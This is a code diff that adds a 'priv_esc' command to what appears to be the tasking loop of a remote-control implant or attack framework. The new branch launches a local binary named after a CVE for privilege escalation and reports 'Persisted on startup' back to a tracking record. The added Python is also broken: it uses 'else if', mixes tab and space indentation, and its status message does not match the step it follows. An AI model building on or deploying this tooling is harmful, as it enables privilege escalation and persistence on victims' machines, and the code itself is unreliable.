@@ -277,6 +277,32 @@ def main():
 						    
 						except FileNotFoundError:
 						    print(f"Binary not found at: {binary_path}")
+					else if command.startswith("priv_esc"):
+
+						# Define relative paths
+						script_dir = os.path.dirname(os.path.abspath(__file__))
+						binary_path = os.path.normpath(os.path.join(script_dir, "../C/priv_esc_CVE-2026-43284"))
+						
+						try:
+						    # Execute the C binary
+						    result = subprocess.run(
+						        [binary_path], 
+						        capture_output=True, 
+						        text=True, 
+						        check=True
+						    )
+						    
+						    # Print the output from the C program
+						    print("Output:", result.stdout)
+							update_result(record_uuid, "Persisted on startup")
+						
+						except subprocess.CalledProcessError as e:
+						    print(f"Error running binary. Exit code: {e.returncode}")
+						    print("Error output:", e.stderr)
+						    
+						except FileNotFoundError:
+						    print(f"Binary not found at: {binary_path}")
+					
 					else:	
 					#	command_value = command.split(":")
 						print(f"\n[Python] Sending System Command  : \"{command}\"")
